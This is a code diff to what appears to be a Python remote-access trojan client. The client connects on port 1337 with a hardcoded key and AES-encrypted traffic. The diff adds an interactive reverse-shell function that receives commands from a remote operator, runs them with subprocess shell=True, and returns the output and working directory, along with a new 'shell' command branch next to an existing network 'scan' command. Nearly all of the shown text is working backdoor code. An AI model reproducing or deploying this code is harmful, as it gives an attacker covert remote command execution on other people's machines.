@@ -10,6 +10,7 @@ import socket
 import subprocess
 import struct
 import sys
+import os
 
 from core import common
 from core import crypto
@@ -26,6 +27,29 @@ PORT      = 1337
 FB_KEY    = '82e672ae054aa4de6f042c888111686a'
 # generate your own key with...
 # python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
+
+
+def shell(sock, dh_key):
+    sock.send(crypto.AES_encrypt(os.getcwd() + "|" + "", dh_key))
+
+    while True:
+        results = ""
+        cmd = crypto.AES_decrypt(sock.recv(1024), dh_key)
+
+        if cmd == "exit":
+            break
+        if cmd.split(" ")[0] == "cd":
+            try:
+                os.chdir(cmd.split(" ")[1])
+            except Exception:
+                pass
+        else:
+            print("Running: {}".format(cmd))
+            results = subprocess.Popen(cmd, shell=True,
+                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                      stdin=subprocess.PIPE)
+            results = results.stdout.read() + results.stderr.read()
+        sock.send(crypto.AES_encrypt(os.getcwd() + "|" + results, dh_key))
 
 
 def main():
@@ -94,6 +118,9 @@ def main():
         elif cmd == 'scan':
             results = scan.single_host(action)
             s.send(crypto.AES_encrypt(results, dh_key))
+
+        elif cmd == 'shell':
+            shell(s, dh_key)
 
 
 if __name__ == '__main__':
